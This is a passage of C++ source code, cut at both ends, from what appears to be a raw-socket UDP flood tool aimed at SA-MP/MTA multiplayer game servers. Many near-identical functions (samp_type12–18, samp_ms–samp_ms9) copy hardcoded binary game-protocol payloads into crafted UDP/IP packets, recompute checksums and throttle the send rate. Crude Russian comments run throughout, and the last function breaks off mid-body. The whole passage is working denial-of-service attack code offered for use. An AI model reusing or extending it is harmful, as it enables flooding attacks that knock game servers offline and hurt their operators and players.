	memcpy((void*)udph + sizeof(struct udphdr), "\x30\x11\xc8\x92\xc8\xd2\xe0\x14\x16\xe4\x01\x80\x00\x00\x06\x40\x00\x00\x00\x61\x23\x91\x26\x11\xa5\xc0\x14\x99\xe4\x00\x00\x00\x00\x00\x00\x00\x00\x00\x62\x23\x91\x26\x91\xa7\xc0\x14\x5a\xe6\x01\xb7\x63\x03\xf1\xf9\x15\xc3\xf8\xc8\x1d\xf3\xe0\x63\x23\x91\x27\x11\xa3\xc0\x14\x12\xe2\x01\x60\x7d\x90\xf0\xb5\x23\x91\x50\x11\xa2\xc0\x14\x1d\xe1\x00\xd3\x50\xda\x23\x91\x62\x91\xa5\xc0\x14\x16\xe4\x01\x80\x00\x00\x06\x40\x00\x00\x00\xdb\x23\x91\x63\x11\xa5\xc0\x14\x99\xe4\x00\x00\x00\x00\x0d\xc0\x00\x00\x00\xdc\x23\x91\x63\x91\xa7\xc0\x14\x5a\xe6\x0f\x0b\x35\xc3\xf0\xf4\x77\xd3\xf6\x7b\x65\xe3\xf0\xdd\x23\x91\x64\x11\xa3\xc0\x14\x12\xe2\x0b\x1d\xae\xb3\x80\x02\x24\x91\x76\x91\xa5\xc0\x14\x16\xe4\x01\x80\x00\x00\x06\x40\x00\x00\x00\x03\x24\x91\x77\x11\xa5\xc0\x14\x99\xe4\x00\x00\x00\x00\x0f\x00\x00\x00\x00\x04\x24\x91\x77\x91\xa7\xc0\x14\x5a\xe6\x05\x76\x37\x83\xfd\x32\xf6\x13\xfc\x2a\xa9\x93\xe0\x05\x24\x91\x78\x11\xa3\xc0\x14\x12\xe2\x03\xbd\xfd\x47\x10", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_type12(struct iphdr* iph, struct udphdr* udph) //нубометод под мта
{
	int playloadlen = 89; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x58\x91\xc8\xa7\x08\xd2\xe0\x14\x16\xe4\x01\x80\x00\x00\x06\x40\x00\x00\x00\xb2\x23\x91\x4e\x91\xa5\xc0\x14\x99\xe4\x00\x00\x00\x00\x0b\xf0\x00\x00\x00\xb3\x23\x91\x4f\x11\xa7\xc0\x14\x5a\xe6\x0a\x03\xee\xe3\xe3\x58\x47\x43\xf9\x5e\x10\x33\xf0\xb4\x23\x91\x4f\x91\xa3\xc0\x14\x12\xe2\x08\xd3\x1e\x57\xf0\xd9\x23\x91\x62\x11\xa2\xc0\x14\x1d\xe1\x00\xd3\x90", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_type13(struct iphdr* iph, struct udphdr* udph) //нубометод под мта
{
	int playloadlen = 76; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x7b\x0a\x48\xb9\x85\x12\xe0\x14\x16\xe4\x01\x80\x00\x00\x06\x40\x00\x00\x00\xf7\x14\x91\x73\x8a\x25\xc0\x14\x99\xe4\x00\x00\x00\x00\x0b\x70\x00\x00\x00\xf8\x14\x91\x74\x0a\x27\xc0\x14\x5a\xe6\x0f\x7d\xc3\x13\xf2\x85\xeb\x43\xe7\x57\x63\xc3\xf0\xf9\x14\x91\x74\x8a\x23\xc0\x14\x12\xe2\x08\xa2\x33\x52\x40", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_type14(struct iphdr* iph, struct udphdr* udph) //нубометод под мта
{
	int playloadlen = 152; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x00\x91\x48\xbb\x08\x52\xe0\x14\x16\xe4\x01\x80\x00\x00\x06\x40\x00\x00\x00\x02\x22\x91\x76\x90\xa5\xc0\x14\x99\xe4\x00\x00\x00\x00\x0f\x80\x00\x00\x00\x03\x22\x91\x77\x10\xa7\xc0\x14\x5a\xe6\x02\x9f\x25\x23\xe7\xcc\xbf\x13\xe3\xc5\x0e\xe3\xe0\x04\x22\x91\x77\x90\xa3\xc0\x14\x12\xe2\x05\x40\xcc\xe7\x60\x25\x22\x91\x08\x11\x25\xc0\x14\x16\xe4\x01\x80\x00\x00\x06\x40\x00\x00\x00\x26\x22\x91\x08\x91\x25\xc0\x14\x99\xe4\x00\x00\x00\x00\x01\xc0\x10\x00\x00\x27\x22\x91\x09\x11\x27\xc0\x14\x5a\xe6\x01\x45\xec\xe3\xea\x7b\x70\xb3\xfe\xc1\x7e\x33\xe0\x28\x22\x91\x09\x91\x23\xc0\x14\x12\xe2\x09\xb2\x41\xc2\xe0", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_type15(struct iphdr* iph, struct udphdr* udph) // 5 ШТУК
{
	int playloadlen = 387; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x09\x03\x48\x81\xc1\x92\xe0\x14\x99\xe4\x00\x00\x00\x00\x0c\xb0\x00\x00\x00\x13\x06\x91\x04\x03\x27\xc0\x14\x5a\xe6\x0f\xd6\x05\xd3\xfd\x61\x35\x53\xfb\xb5\x54\x23\xf0\x14\x06\x91\x04\x83\x23\xc0\x14\x12\xe2\x0a\x7e\x17\x14\x90\x15\x06\x91\x05\x03\x25\xc0\x14\x16\xe4\x01\x80\x00\x00\x06\x40\x00\x00\x00\x16\x06\x91\x05\x83\x25\xc0\x14\x99\xe4\x00\x00\x00\x00\x02\x40\x10\x00\x00\x17\x06\x91\x06\x03\x27\xc0\x14\x5a\xe6\x07\x20\x55\x03\xf6\x72\x19\xe3\xec\xe9\xe2\x83\xf0\x18\x06\x91\x06\x83\x23\xc0\x14\x12\xe2\x06\x17\xc3\x42\x40\x19\x06\x91\x07\x03\x22\xc0\x14\x1d\xe1\x00\x00\xb0\x1a\x06\x91\x07\x83\x25\xc0\x14\x16\xe4\x01\x80\x00\x00\x06\x40\x00\x00\x00\x1b\x06\x91\x08\x03\x25\xc0\x14\x99\xe4\x00\x00\x00\x00\x03\x80\x00\x00\x00\x1c\x06\x91\x08\x83\x27\xc0\x14\x5a\xe6\x00\xb0\xc4\x73\xfa\x61\x05\x33\xf4\x7e\x64\x03\xf0\x1d\x06\x91\x09\x03\x23\xc0\x14\x12\xe2\x01\x5e\xd1\xf5\xd0\x1e\x06\x91\x09\x83\x25\xc0\x14\x16\xe4\x01\x80\x00\x00\x06\x40\x00\x00\x00\x1f\x06\x91\x0a\x03\x25\xc0\x14\x99\xe4\x00\x00\x00\x00\x0c\x70\x00\x00\x00\x20\x06\x91\x0a\x83\x27\xc0\x14\x5a\xe6\x06\xea\x7f\x93\xe8\x27\xb6\x73\xf8\x76\x01\xd3\xf0\x21\x06\x91\x0b\x03\x23\xc0\x14\x12\xe2\x01\xd0\xf4\x60\xe0\x22\x06\x91\x0b\x83\x22\xc0\x14\x1d\xe1\x00\x00\xc0\x23\x06\x91\x0c\x03\x25\xc0\x14\x16\xe4\x01\x80\x00\x00\x06\x40\x00\x00\x00\x24\x06\x91\x0c\x83\x25\xc0\x14\x99\xe4\x00\x00\x00\x00\x05\x60\x00\x00\x00\x25\x06\x91\x0d\x03\x27\xc0\x14\x5a\xe6\x02\xbb\x7d\xd3\xe7\x61\x9f\x23\xe6\x38\xd0\x83\xf0\x26\x06\x91\x0d\x83\x23\xc0\x14\x12\xe2\x0d\x01\x9b\x56\xa0", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_type16(struct iphdr* iph, struct udphdr* udph) //нубометод под мта
{
	int playloadlen = 54; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x76\x9c\x38\x63\x46\xc7\x00\x10\xcf\x32\x03\xa2\x00\x65\x3f\xc0\x00\x36\xd8\xf8\xd1\x23\xbd\x39\xf1\x00\x28\x15\x90\x44\x00\x00\x00\x01\x0f\xeb\xc0\x00\x01\xd0\x87\xd8\xf5\x59\x2d\x54\x2f\xfd\xfd\xad\x04\x08\x80\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_type17(struct iphdr* iph, struct udphdr* udph) //нубометод под мта
{
	int playloadlen = 339; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x72\x9c\x38\x61\x46\xc6\x80\x10\xc8\x31\x03\x6f\x02\x80\xff\x00\x00\x28\x00\x06\x70\x31\xd0\x4b\xf3\x25\x00\x0e\x14\x4f\x1c\xaf\x0c\x4b\x99\x35\x74\x13\x93\xfa\x43\xcc\x4f\x64\x75\x09\x48\x0d\x00\x5f\x00\x04\x00\xe6\x38\x70\xc3\x0d\x82\x00\x20\xcb\x31\x03\x12\x52\x12\x4f\x3f\xc2\x5f\x14\xbf\x5c\xc8\xca\xbd\xba\x23\xe0\x44\xe2\x2c\xf0\xc4\xd4\x2b\x72\x41\x00\x00\x00\x00\x3f\x21\xe7\x38\x70\xc3\x8d\x8c\x00\x20\xcf\xfb\x02\x60\x3f\xc0\x00\x10\x6b\xf7\x11\x13\xe8\xbb\x71\x09\x02\xd6\x50\x40\x00\x00\x00\x01\x5c\x5b\x00\x00\x00\x40\x02\xb8\xf6\x1e\x51\x5b\xfb\xfd\xfd\xc8\x04\xe8\x80\x00\xe8\x38\x70\xc4\x0d\x8c\x00\x20\xcf\x51\x03\x60\x3f\xc0\x00\x1c\xf5\xf7\x11\x26\xf2\xbb\x71\x3a\xc3\x96\x50\x40\x00\x00\x00\x00\x3a\x03\xc0\x00\x01\x42\x5e\xcc\xf6\xcb\xc2\xb6\xf3\xfd\xfd\xc8\x04\xe8\x80\x00\xe9\x38\x70\xc4\x8d\x8e\x00\x20\xcf\x32\x03\xa2\x80\x65\x7f\xc2\x00\x23\x59\xb8\xd1\x21\xbb\xb9\xf1\x00\x28\x15\x90\x44\x00\x00\x00\x01\xcf\xeb\xc0\x00\x01\x50\x23\xf8\xf4\xd1\x33\xc8\x2b\xfd\xfd\xac\x04\x64\x80\x00\xea\x38\x70\xc5\x0d\x84\x00\x20\xcf\x17\x00\x00\x00\x34\xb8\xb7\xd1\x16\x5a\xfc\x31\x25\x8f\x95\x90\x40\x00\x00\x00\x01\x3f\xf7\xc0\x00\x00\x00\x00\x00\x01\xa5\x04\x04\x80\x00\xeb\x38\x70\xc5\x8d\x82\x00\x20\xcb\x17\x00\x04\xbb\x24\xb8\x3e\xeb\x54\x6d\xbf\xda\x82\xd8\xbd\x05\xbb\xdf\x44\xc0\x04\xf0\xc4\xc4\xb1\x65\x41\x00\x00\x00\x00\x3e\x1b", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_type18(struct iphdr* iph, struct udphdr* udph) //нубометод под мта
{
	int playloadlen = 158; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x77\x9c\x38\x63\xc6\xc6\x00\x10\xcf\xfb\x02\x60\x3f\xc0\x00\x0c\xec\x77\x11\x0e\xe6\x7b\x71\x28\xc2\x96\x50\x40\x00\x00\x00\x01\x08\x83\x00\x00\x00\x5c\x02\x70\xf7\xee\x78\xc3\xf3\xfd\xfd\xc8\x04\xe8\x80\x00\xf0\x38\x70\xc8\x0d\x8c\x00\x20\xcf\x51\x03\x60\x3f\xc0\x00\x23\x78\x37\x11\x23\xb1\x3b\x71\x34\x83\x96\x50\x40\x00\x00\x00\x00\x7d\xcf\xc0\x00\x02\x0d\x56\xbc\xf7\x4b\x98\xe7\x33\xfd\xfd\xc8\x04\xe8\x80\x00\xf1\x38\x70\xc8\x8d\x8e\x00\x20\xcf\x32\x03\xa2\x00\x65\x3f\xc0\x00\x15\x98\x78\xd1\x09\x3e\xb9\xf1\x00\x28\x15\x90\x44\x00\x00\x00\x01\x0f\xeb\xc0\x00\x01\xe2\x63\x80\xf5\x59\x2d\x54\x2f\xfd\xfd\xad\x04\x08\x80\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_ms(struct iphdr* iph, struct udphdr* udph) 
{
	int playloadlen = 95; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x56\x9c\xb8\x41\x07\x06\x80\x10\xc8\x31\x03\x6f\x02\x80\xff\x00\x00\x28\x00\x1e\x90\x17\x30\x58\x31\x9e\x91\xee\x14\x4b\xfc\xbf\x0c\x4e\x19\x45\x74\x13\x57\x58\x73\xca\xbf\xcf\xb9\xca\xe7\xfd\x00\x5f\x00\x04\x00\xae\x39\x70\x82\x8e\x02\x00\x20\xcb\x31\x03\x12\x07\x04\x53\x3f\x7e\xb5\x0e\xbf\x5c\xc8\xca\xbd\x1e\x3e\xe0\x44\xba\x33\xf0\xc4\x0e\x2d\x72\x41\x00\x00\x00\x00\x3f\x21", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_ms2(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 3; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\xe3\xc4\x04", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_ms3(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 500; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x50\x1d\x48\x9e\x87\x11\x60\x14\x2f\xe1\x0a\x00\x00\xa1\x3a\x91\x3d\x8e\x22\xc0\x14\x2f\xe1\x0a\xb0\x00\xa2\x3a\x91\x3e\x0e\x22\xc0\x14\x2f\xe1\x02\xc0\x30\xa3\x3a\x91\x3e\x8e\x22\xc0\x14\x2f\xe1\x00\xb0\x10\xa4\x3a\x91\x3f\x0e\x22\xc0\x14\x2f\xe1\x0a\x60\x00\xa5\x3a\x91\x3f\x8e\x22\xc0\x14\x2f\xe1\x0a\x90\x00\xa6\x3a\x91\x40\x0e\x22\xc0\x14\x2f\xe1\x0b\x70\x00\xa7\x3a\x91\x40\x8e\x22\xc0\x14\x2f\xe1\x0b\x20\x00\xa8\x3a\x91\x41\x0e\x22\xc0\x14\x2f\xe1\x0f\xe0\x00\xa9\x3a\x91\x41\x8e\x22\xc0\x14\x2f\xe1\x07\xa0\x10\xaa\x3a\x91\x42\x0e\x22\xc0\x14\x2f\xe1\x00\x80\x10\xab\x3a\x91\x42\x8e\x22\xc0\x14\x2f\xe1\x0d\xa0\x30\xac\x3a\x91\x43\x0e\x0c\x60\x20\x14\x2c\xc8\x00\x3b\x40\x7b\x83\xc0\x00\x0a\x62\x1d\x88\x82\xf7\x21\x38\xa7\x14\x22\x68\x31\x7c\x3d\x46\xd4\x91\x97\x06\xf1\x7c\x2d\x56\xe0\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\xad\x3a\x91\x43\x8e\x04\x60\x20\x14\x54\xc0\x00\x3b\x40\x60\x20\x01\xa5\x41\xec\x2d\x2e\x4e\x0d\xee\x4e\x8c\xed\xcc\x8b\xee\x6c\xce\x6c\xa0\xae\xed\x0d\x2e\x8c\xa0\x00\x00\x00\x00\xae\x3a\x91\x44\x0e\x0c\x60\x20\x14\x2c\xc8\x00\x21\x00\x2b\xc1\xe0\x00\x12\x3e\x1d\x08\x9a\xcb\xc1\x58\xa0\x18\x09\x08\x34\x91\x97\x16\xf1\x7c\x2d\x46\xfe\x7f\xf6\x78\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\xaf\x3a\x91\x44\x8e\x0c\x60\x20\x14\x2c\xc8\x00\x2f\x40\x36\x69\x40\x00\x1a\xeb\x5d\xa8\x97\xf1\x61\x38\xa0\x18\x09\x08\x31\x7c\x2d\x56\xf1\x7c\x2d\x46\xfe\xdf\xf6\x78\x40\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\xb0\x3a\x91\x45\x0e\x01\x80\x20\x14\x54\xef\x07\xa0\x10\x10\x14\xc3\x90\x43\x73\x13\x16\x30\xe6\x36\xa5\xf7\x76\x86\x97\x46\x55\xf7\x76\x16\xc6\xc3\x20\x00\x00\x00\x00\xb1\x3a\x91\x45\x8e\x0c\x60\x20\x14\x2c\xc8\x00\x3f\xc0\x1b\x83\xc0\x00\x0a\x6a\x1e\x48\x8f\x87\xe1\x18\xa7\x14\x22\x68\x31\x7c\x3d\x46\xd1\x7c\x2d\x46\xf1\x7c\x2d\x56\xe0\x00\x12\xc8\x60\x1f\xff\xff\xff\xe0\x00\xb2\x3a\x91\x46\x0e\x04\x60\x20\x14\x54\xc0\x00\x3f\xc0\x00\x20\x01\xa5\x41\xec\x2d\x2e\x4e\x0d\xee\x4e\x8c\xed\xcc\x8b\xee\x6c\xce\x6c\xa0\xae\xed\x0d\x2e\x8c\xa0\x00\x00\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_ms4(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 160; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x17\x9e\xb8\x5f\x07\x87\x00\x10\xcf\x32\x03\xf8\x7f\xe0\xbf\xc0\x00\x1c\xc3\xf8\x91\x3f\x4d\xfb\x31\x3f\xe4\x95\x90\x44\x00\x00\x00\x01\xff\xdb\xc0\x00\x01\x68\xdb\xf0\xf5\x90\xf6\xc4\x4b\xfd\xfd\xac\x04\x64\x80\x00\x30\x3d\x70\xbe\x8f\x0c\x00\x20\xcf\x51\x03\x60\x3f\xc0\x00\x39\x85\xb8\x11\x23\xf4\x7b\x71\x33\x18\x15\x90\x40\x00\x00\x00\x03\x76\xdb\xc0\x00\x01\x51\x0d\xc4\xf7\xe3\xfd\x79\xf7\xfd\xfd\xac\x04\x64\x80\x00\x31\x3d\x70\xbf\x0f\x0e\x00\x20\xcf\xe1\x02\xce\x7f\xec\x7f\xc0\x00\x0b\xee\x38\x91\x06\x15\xfa\x71\x00\x10\x16\x50\x40\x00\x00\x00\x00\x46\xab\xc0\x00\x00\x17\xaa\xcc\xf6\xc7\xf3\x8a\x73\xfd\xfd\xc8\x04\x04\x80\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_ms5(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 14; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x09\x1f\x48\x97\xc7\x51\xa0\x14\x45\xe1\x8a\x60\x0f\xe0", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_ms6(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 35; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x09\x9f\x48\x98\x07\x52\x60\x14\x48\xe3\x0a\x60\x01\x5f\xcf\xcf\xd0\x14\x3e\x84\x50\xdc\xaa\xa6\x00\x01\x15\x3e\x84\x50\xdc\xaa\xa6\x00\x02", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_ms7(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 52; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x1b\x9f\x38\x58\xc7\xc6\x00\x10\xcf\xfb\x02\x60\x3f\xc2\x00\x11\x94\xb7\x51\x25\x1f\x7b\x71\x1e\x39\xd6\x10\x40\x00\x00\x00\x02\x76\x6f\x00\x00\x03\xac\x79\x1c\xf6\x3f\xed\x9a\x87\xfd\xfd\xc8\x04\x04\x80\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_ms8(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 70; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x57\x9f\x48\xa0\x07\x4e\xb0\x10\x14\x3b\xd9\x00\x2a\x00\x1f\xff\xff\xff\xe0\x00\x1c\x08\x17\x01\x60\x00\x05\x4f\x66\xc6\xa8\x66\x27\x08\x6f\xa8\x28\xc9\x6f\x68\xc8\xc8\xc8\xc8\xc8\xcf\xa4\x19\x5e\x7f\x1c\x1c\xbe\x44\x0f\x66\xc7\x28\x46\x28\xa6\x8f\xa5\x06\xa7\x46\x06\x05\x65\x20", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_ms9(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 200; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
